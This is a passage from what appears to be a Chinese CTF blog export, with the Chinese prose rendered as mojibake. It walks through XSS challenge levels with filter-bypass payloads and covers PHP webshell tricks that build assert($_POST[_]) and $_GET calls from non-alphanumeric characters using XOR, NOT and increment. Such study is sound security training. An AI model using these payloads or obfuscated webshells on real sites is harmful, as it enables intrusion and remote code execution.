text;\n}</code></pre><p>ç¬¬ä¸€è¡Œè¿‡æ»¤å°†æ‰€æœ‰ <code>&lt; &quot;</code> è¿›è¡Œå®ä½“ç¼–ç </p>\n<p>ç¬¬äºŒè¡Œå°†æ‰€æœ‰ <code>http://S+</code> æ›¿æ¢ä¸º <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,è¿™é‡Œ S+ ä¸ºåŒ¹é…ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p>\n<p>ç¬¬ä¸‰è¡Œå°† <code>[[a|b]]</code> æ›¿æ¢ä¸º <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>è¾“å‡ºï¼š</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>é€šè¿‡ <code>http://onerror=alert(1)//</code> å¼•å…¥ <code>alt=&quot;***&quot;</code> ,æ­¤æ—¶å¼•å·å†…çš„å†…å®¹è§¦å‘ç¬¬äºŒè¡Œçš„æ£€æµ‹ æ›¿æ¢ä¸º<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> æ­¤æ—¶ <code>href</code> å¸¦æ¥çš„ <code>&quot;</code> å°† <code>alt</code> çš„å¼•å·é—­åˆï¼ŒåŒæ—¶ <code>//</code> å°†åé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œé€ æˆ <code>http://onerror=alert(1)</code> é€ƒé€¸å‡ºæ¥ã€‚</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>é€šè¿‡ <code>split</code> å¯¹ä¼ å…¥çš„ s è¿›è¡Œåˆ†å‰²<br>    var s=â€creat#fooâ€; var m=s.split(/#/); m<br>    Array [ â€œcreatâ€, â€œfooâ€ ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>ç›¸å½“äºè°ƒç”¨äº† document.creatXXX() ,è¿™é‡Œæœ‰å‡ ä¸ªå¸¸ç”¨çš„åˆ›å»º DOM èŠ‚ç‚¹æ–¹æ³•</p>\n<pre><code>createElement() åˆ›å»ºä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹\ncreateTextNode() åˆ›å»ºä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹\ncreateAttribute() åˆ›å»ºä¸€ä¸ªå±æ€§èŠ‚ç‚¹\ncreateComment() åˆ›å»ºä¸€ä¸ªæ³¨é‡ŠèŠ‚ç‚¹</code></pre><p>æµ‹è¯•æœ€åä¸€ä¸ªï¼š</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: é—­åˆæ³¨é‡Š</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ s å…¨éƒ¨å˜æˆå¤§å†™ï¼Œç›´æ¥è¾“å…¥ <code>alert</code> å˜æˆ <code>ALERT</code> ä¹‹åæ— æ³•æ‰§è¡Œã€‚</p>\n<p>åˆ©ç”¨ HTML ç¼–ç ç»•è¿‡</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>å…³äºæµè§ˆå™¨å¦‚ä½•å¤„ç†ç¼–ç ï¼Œè´´ä¸€ç¯‡å¤§ä½¬åšå®¢ï¼š<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>å…ˆå°è¯• <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>æŸ¥çœ‹æºç å‘ç°è¢«è½¬ä¹‰æˆ</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>çœ‹èµ·æ¥æ— æ³•æˆåŠŸäº†ï¼Œä½†æ˜¯æ—è¾¹è¿˜æœ‰ä¸ªä¸‹æ‹‰æ ï¼Œæˆ‘ä»¬æŠ“åŒ…è¯•è¯•ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°ï¼š</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! è¿™ä¸€å…³åªæ˜¯é˜²å¾¡äº†ç¬¬ä¸€ä¸ªæ ä½ï¼Œä»¥åè¦å¤šç•™å¿ƒç±»ä¼¼çš„ã€‚</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>çœ‹èµ·æ¥å’Œç¬¬ä¸‰å…³ä¸€æ ·ï¼Œä»ç„¶æ˜¯å…ˆæµ‹è¯•ï¼Œå‘ç°è¢«è½¬ä¹‰ï¼ŒæŠ“åŒ…å‘ç°å¤šäº†ä¸€ä¸ªå‚æ•° p3 ï¼Œé¦–å…ˆå¯¹æ–°å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œä¿®æ”¹æˆ <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> å‘åŒ…å‘ç°è¿˜æ˜¯å¤±è´¥ï¼ŒæŸ¥çœ‹æºç ä¹‹åä¸ç¬¬äºŒå…³ä¸€æ ·é—­åˆ <code>&quot;&gt;</code> å³å¯ã€‚</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>å‘ç°åªæ˜¾ç¤ºäº†ä¸€æ®µï¼Œ<code>F12</code> ï¼Œä¿®æ”¹é•¿åº¦å†æµ‹</p>\n<p>æ²¡æœ‰è¿‡æ»¤ã€‚</p>\n<p>å¥½äº†ï¼Œä¿®æ”¹é•¿åº¦ï¼Œç›´æ¥æ’å…¥å§ï¼ </p>\n<p>è¯•å®Œæ²¡æˆåŠŸï¼Œå†çœ‹çœ‹æºç ï¼ŒåŸæ¥æ˜¯æ²¡é—­åˆ <code>value</code> ï¼Œæ‰‹åŠ¨é—­åˆæäº¤ï¼š</p>\n<p>stage5 çš„ä½œç”¨åªæ˜¯æƒ³å‘Šè¯‰æˆ‘ä»¬ <strong>å®¢æˆ·ç«¯çš„é˜²æŠ¤æ˜¯æ— æ•ˆçš„</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>è¢«è½¬ä¹‰ï¼Œè€Œä¸”æ²¡æœ‰å…¶ä»–çš„æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ ä½ï¼Œè¿™æ€ä¹ˆæï¼Ÿ</p>\n<p>ç­”æ¡ˆæ˜¯ç”¨ html è¯­æ³•ï¼ŒXSSä¸æ˜¯åªèƒ½æ’å…¥ JS ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ HTML è¯­æ³•ï¼Œä¸ç”¨ <code>&lt;&gt;/</code> åˆ©ç”¨äº‹ä»¶è§¦å‘</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,è¿™æ¬¡è¿ <code>&quot;</code> éƒ½è½¬ç§»äº†</p>\n<p>è¿˜æ˜¯ä½¿ç”¨ html è¯­æ³•ï¼Œä½¿ç”¨ç©ºæ ¼åˆ†å‰²å±æ€§ï¼ŒåŠ å…¥ä¸€ä¸ª <code>&quot;</code> æ¥ç»“æŸå‰é¢çš„è¯­å¥</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , è¿™æ¬¡æ˜¯å°†è¾“å…¥æ’å…¥åˆ°è¶…é“¾æ¥é‡Œï¼Œæˆ‘ä»¬ç›´æ¥æ’å…¥</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>è¡Œä¸é€šï¼Œå› ä¸ºæˆ‘ä»¬ç‚¹é“¾æ¥å‘ç°æ˜¯ <code>404</code> ï¼Œæ¢æˆ <code>JavaScript</code> è¯•è¯•</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>æ’å…¥åç‚¹å‡»é“¾æ¥ï¼š</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>ä¸æ”¯æŒ UTF-7 ç¼–ç ï¼Œæ‰€ä»¥è·³è¿‡</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","text":"xsså¤‡å¿˜11/1/2019 10:50:21 AM DVWAreflectedlow&lt;script&gt;alert(1);&lt;/script&gt;medium&lt;scRiPt&gt;alert(1);&lt;/script&gt;high&lt;?phphea","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]},{"title":"ç‰¹æ®Šçš„webshell","slug":"ç‰¹æ®Šçš„webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T03:59:06.848Z","comments":true,"path":"api/articles/ç‰¹æ®Šçš„webshell.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"ç‰¹æ®Šçš„webshell\"><a href=\"#ç‰¹æ®Šçš„webshell\" class=\"headerlink\" title=\"ç‰¹æ®Šçš„webshell\"></a>ç‰¹æ®Šçš„webshell</h1><p>å®éªŒç¯å¢ƒ ï¼š<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>\n<p>ä½† php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚</p>\n</blockquote>\n<h2 id=\"ä¸åŒ…å«æ•°å­—å­—æ¯\"><a href=\"#ä¸åŒ…å«æ•°å­—å­—æ¯\" class=\"headerlink\" title=\"ä¸åŒ…å«æ•°å­—å­—æ¯\"></a>ä¸åŒ…å«æ•°å­—å­—æ¯</h2><pre><code>&lt;?php\n@highlight_file(__FILE__);\nif(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) {\n eval($_GET[&apos;shell&apos;]);\n}\n?&gt;</code></pre><h3 id=\"å¼‚æˆ–\"><a href=\"#å¼‚æˆ–\" class=\"headerlink\" title=\"å¼‚æˆ–\"></a>å¼‚æˆ–</h3><p>å¼‚æˆ–æ˜¯å¯¹å­—ç¬¦çš„ <code>ascii</code>ç è¿›è¡Œé€ä½å¼‚æˆ–ä»¥åå¾—åˆ°ä¸€ä¸ªå¼‚æˆ–ç»“æœ<code>ascii</code>ç çš„å­—ç¬¦ã€‚</p>\n<p>ç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯è¿™æ ·æ¥ç»•è¿‡æ•°å­—å­—æ¯çš„æ£€æµ‹ã€‚</p>\n<pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01\n$b=urldecode(&apos;`&apos;);   //ascii 96\necho $a^$b;             //a\n96:  0110 0000\n%01: 0000 0001         //ç›¸å½“äºascii+1</code></pre><p>æˆ‘ä»¬ç»Ÿä¸€é€‰å–  â€˜`â€™  ä½œä¸ºæˆ‘ä»¬å¼‚æˆ–çš„èµ·ç‚¹ï¼Œå› ä¸ºä»–çš„ ascii æ˜¯96ã€‚</p>\n<pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);\n$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;\n$___=$$__;\n$_($___[_]); // assert($_POST[_]);</code></pre><p>åœ¨å¦‚ä¸‹è¿‡æ»¤ä¸­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬ <code>POST : _=phpinfo();</code> å³å¯æˆåŠŸæ‰§è¡Œ</p>\n<h3 id=\"å–å\"><a href=\"#å–å\" class=\"headerlink\" title=\"å–å\"></a>å–å</h3><p>é€šè¿‡å–åå°†æ±‰å­—ç¼–ç ä¸­çš„ç¼–ç å–å‡ºæ¥è¿›è¡Œå–å</p>\n<pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//åˆ©ç”¨å¼±ç±»å‹çš„ç‰¹æ€§\n$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\necho $_;\necho ~(&apos;å’Œ&apos;{2});              //s</code></pre><p>payload:</p>\n<pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);\n$_=$__/$__;\n\n$____=&apos;&apos;;\n$___=&quot;ç°&quot;;$____.=~($___{$_});$___=&quot;å’Œ&quot;;$____.=~($___{$__});$___=&quot;å’Œ&quot;;$____.=~($___{$__});$___=&quot;çš„&quot;;$____.=~($___{$_});$___=&quot;åŠ&quot;;$____.=~($___{$_});$___=&quot;å§‹&quot;;$____.=~($___{$__});\n\n$_____=&apos;_&apos;;$___=&quot;ä¿¯&quot;;$_____.=~($___{$__});$___=&quot;ç°&quot;;$_____.=~($___{$__});$___=&quot;æ¬¡&quot;;$_____.=~($___{$_});$___=&quot;ç«™&quot;;$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);</code></pre><p>æ•ˆæœå¦‚ä¸‹ï¼š</p>\n<h3 id=\"å­—ç¬¦é€’å¢\"><a href=\"#å­—ç¬¦é€’å¢\" class=\"headerlink\" title=\"å­—ç¬¦é€’å¢\"></a>å­—ç¬¦é€’å¢</h3><blockquote>\n<p>åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Perl ä¸­ $a = â€˜Zâ€™; $a++; å°†æŠŠ $a å˜æˆâ€™AAâ€™ï¼Œè€Œåœ¨ C ä¸­ï¼Œa = â€˜Zâ€™; a++; å°†æŠŠ a å˜æˆ â€˜[â€˜ï¼ˆâ€™Zâ€™ çš„ ASCII å€¼æ˜¯ 90ï¼Œâ€™[â€˜ çš„ ASCII å€¼æ˜¯ 91ï¼‰ã€‚æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚ </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>æˆ‘ä»¬åªè¦æ‹¿åˆ°ä¸€ä¸ªå˜é‡å€¼ä¸º <code>a</code> ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå°±å¯ä»¥è·å¾— <code>a-z</code> ä¸­æ‰€æœ‰å­—ç¬¦ã€‚</p>\n<p>phpä¸­å¦‚æœå¼ºåˆ¶é“¾æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå€¼ä¸º <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>æˆ‘ä»¬å–ç¬¬ä¸€ä¸ªå­—ç¬¦å°±å¯ä»¥å¾—åˆ° <code>A</code> äº†ã€‚</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id=\"é™åˆ¶é•¿åº¦\"><a href=\"#é™åˆ¶é•¿åº¦\" class=\"headerlink\" title=\"é™åˆ¶é•¿åº¦\"></a>é™åˆ¶é•¿åº¦</h2><p>PHPå¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼š</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>é¢˜ç›®ï¼š</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>é™åˆ¶é•¿åº¦ä¸º40ï¼Œä¹‹å‰çš„å¼‚æˆ–ä¸è¡Œäº†ã€‚æˆ‘ä»¬è¦åˆ©ç”¨PHPå…è®¸åŠ¨æ€æ‰§è¡Œå‡½æ•°çš„ç‰¹ç‚¹ï¼Œæ„é€ ä¸€ä¸ª <code>_GET</code> æ¥å»è¯»å– <code>getFlag()</code> </p>\n<p>å¯ä»¥é€šè¿‡è¿ç»­è°ƒç”¨å¼‚æˆ–æ¥è·å¾— <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>é€šè¿‡æ„é€  <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> æ¥è·å–å‚æ•°</p>\n<p>æœ€åä¼ å…¥å‚æ•° getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>åé¢çš„ <code>__</code> æˆ‘ä»¬ä¸ä¼ å€¼é»˜è®¤ä¸º <code>NULL</code> ä¹Ÿå°±ç›¸å½“äº <code>getFlag()</code></p>\n<p>äº‹å®ä¸Šä¸‹é¢è¿™ä¹Ÿå¯ä»¥ï¼š</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"æ‰©å±•\"><a href=\"#æ‰©å±•\" class=\"headerlink\" title=\"æ‰©å±•\"></a>æ‰©å±•</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>å¯¹ <code>getFlag</code> è¿›è¡Œå–åç„¶å <code>URL</code> ç¼–ç </p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>è¿™ä¸ªåœ¨{}ä¸­è¿›è¡Œå–å <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ï¼Œç›¸å½“äº <code>$_GET</code>ï¼Œæ‹¼æ¥å‡ºäº† <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>ï¼Œä¼ å…¥ <code>+=getFlag()</code> ä»è€Œæ‰§è¡Œäº†å‡½æ•°`</p>\n<h2 id=\"ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\"><a href=\"#ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\" class=\"headerlink\" title=\"ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\"></a>ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿</h2><p>é¢˜ç›®ï¼š</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>é€šè¿‡ä¸Šé¢çš„å–åå°±å¯ä»¥äº†</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>è¿™é‡Œåˆ©ç”¨ <code>${}</code> ä¸­çš„ä»£ç å¯ä»¥æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œåœ¨ <code>{}</code> é‡Œè¿›è¡Œå–åæ“ä½œï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯å˜å˜é‡</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\nè¾“å‡ºï¼šhello world</code></pre><p>è¿™é‡Œçš„ <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> ç›¸å½“äº <code>$_GET</code> .</p>\n<p>è¿˜æœ‰æ›´éªšçš„ï¼Œç”¨ä¸­æ–‡ï¼š</p>\n<pre><code>code=$å•Š=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>ç›¸å½“äºç›´æ¥ç»™å˜é‡èµ‹å€¼äº†ï¼Œè¿™æ ·å°±ä¸ç”¨ <code>{}</code> äº†</p>\n<h2 id=\"ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€\"><a href=\"#ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€\" class=\"headerlink\" title=\"ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$\"></a>ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> 